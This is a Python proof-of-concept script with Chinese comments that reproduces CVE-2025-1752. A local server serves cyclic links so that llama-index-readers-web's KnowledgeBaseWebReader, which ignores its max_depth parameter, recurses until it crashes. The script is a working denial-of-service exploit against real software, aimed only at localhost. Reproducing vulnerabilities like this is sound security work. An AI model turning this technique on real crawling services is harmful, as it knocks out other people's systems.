#!/usr/bin/env python3
"""
CVE-2025-1752 完整复现脚本

漏洞：llama-index-readers-web 0.3.5 中的 KnowledgeBaseWebReader 类
      get_article_urls 函数忽略 max_depth 参数导致无限递归 DoS

复现方法：
1. 启动一个包含循环链接的本地 HTTP 服务器
2. 使用 KnowledgeBaseWebReader 爬取该服务器
3. 观察无限递归导致的栈溢出

需要：playwright, llama-index-readers-web==0.3.5
"""

import sys
import threading
import http.server
import socketserver
import time

# 模拟一个会导致无限循环的网站
MALICIOUS_HTML = """
<!DOCTYPE html>
<html>
<head><title>Knowledge Base</title></head>
<body>
    <h1>Welcome to Knowledge Base</h1>
    <div class="article-list">
        <a href="/page1">Page 1</a>
        <a href="/page2">Page 2</a>
        <a href="/page3">Page 3</a>
    </div>
</body>
</html>
"""

# 每个页面都链接回其他页面，形成循环
PAGE_HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Page {page_num}</title></head>
<body>
    <h1>Page {page_num}</h1>
    <div class="article-list">
        <a href="/page{next1}">Go to Page {next1}</a>
        <a href="/page{next2}">Go to Page {next2}</a>
        <a href="/">Back to Home</a>
    </div>
</body>
</html>
"""


class MaliciousHandler(http.server.SimpleHTTPRequestHandler):
    """模拟一个包含循环链接的知识库网站"""
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        if self.path == '/' or self.path == '':
            content = MALICIOUS_HTML
        elif self.path.startswith('/page'):
            try:
                page_num = int(self.path.replace('/page', ''))
                # 创建循环链接
                next1 = (page_num % 10) + 1
                next2 = ((page_num + 1) % 10) + 1
                content = PAGE_HTML_TEMPLATE.format(
                    page_num=page_num, 
                    next1=next1, 
                    next2=next2
                )
            except:
                content = MALICIOUS_HTML
        else:
            content = MALICIOUS_HTML
        
        self.wfile.write(content.encode())
    
    def log_message(self, format, *args):
        # 减少日志输出
        pass


def start_server(port=8888):
    """启动恶意服务器"""
    with socketserver.TCPServer(("", port), MaliciousHandler) as httpd:
        print(f"[*] Malicious server started on port {port}")
        httpd.serve_forever()


def trigger_vulnerability():
    """触发漏洞 - 直接测试 get_article_urls 函数"""
    print("[*] Installing vulnerable package...")
    import subprocess
    subprocess.run([sys.executable, "-m", "pip", "install", 
                   "llama-index-readers-web==0.3.5", "-q"], check=True)
    
    print("[*] Importing KnowledgeBaseWebReader...")
    from llama_index.readers.web import KnowledgeBaseWebReader
    
    print("[*] Creating KnowledgeBaseWebReader instance...")
    reader = KnowledgeBaseWebReader(
        root_url="http://localhost:8888",
        link_selectors=[".article-list a"],
        article_path="/articles",  # 这个路径不存在，所以会一直递归
        max_depth=5  # 这个参数会被忽略！！
    )
    
    print("[*] Launching browser with Playwright (headless mode)...")
    from playwright.sync_api import sync_playwright
    
    playwright = sync_playwright().start()
    browser = playwright.chromium.launch(headless=True)  # 使用 headless 模式
    
    print("[*] Triggering vulnerability by calling get_article_urls()...")
    print("[*] max_depth=5 is passed but will be IGNORED!")
    print("[*] Expected: RecursionError due to infinite recursion")
    print("-" * 50)
    
    try:
        # 设置较低的递归限制以更快触发错误
        original_limit = sys.getrecursionlimit()
        sys.setrecursionlimit(50)  # 降低限制以更快看到效果
        
        # 直接调用有漏洞的函数
        reader.get_article_urls(
            browser=browser,
            root_url="http://localhost:8888",
            current_url="http://localhost:8888",
            max_depth=5  # 这个参数会被忽略！
        )
        
    except RecursionError as e:
        print(f"\n[!] SUCCESS: RecursionError triggered!")
        print(f"[!] Error: {e}")
        print("[!] This proves the max_depth parameter is not being used!")
        browser.close()
        playwright.stop()
        return True
        
    except Exception as e:
        print(f"\n[!] Error: {type(e).__name__}: {e}")
        browser.close()
        playwright.stop()
        return False
        
    finally:
        sys.setrecursionlimit(original_limit)


def main():
    print("=" * 60)
    print("CVE-2025-1752 - KnowledgeBaseWebReader DoS Vulnerability")
    print("=" * 60)
    print()
    print("Vulnerability: max_depth parameter in get_article_urls() is ignored")
    print("Impact: Infinite recursion leads to stack exhaustion (DoS)")
    print()
    
    # 启动恶意服务器
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    time.sleep(1)  # 等待服务器启动
    
    # 触发漏洞
    success = trigger_vulnerability()
    
    if success:
        print("\n" + "=" * 60)
        print("VULNERABILITY CONFIRMED!")
        print("=" * 60)
        return 0
    else:
        print("\n" + "=" * 60)
        print("Could not confirm vulnerability")
        print("=" * 60)
        return 1


if __name__ == "__main__":
    sys.exit(main())
